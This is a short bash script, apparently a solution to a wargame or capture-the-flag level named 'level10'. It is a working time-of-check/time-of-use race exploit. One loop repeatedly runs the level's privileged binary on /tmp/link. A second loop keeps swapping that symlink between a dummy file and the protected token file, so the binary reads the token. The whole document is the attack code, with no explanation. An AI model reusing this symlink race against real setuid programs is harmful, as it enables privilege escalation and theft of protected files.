#!/bin/bash

touch fake

while true; do
        /home/user/level10/level10 /tmp/link "127.0.0.1"
done &

while true; do
        ln -sf /tmp/fake /tmp/link
        ln -sf /home/user/level10/token /tmp/link
done
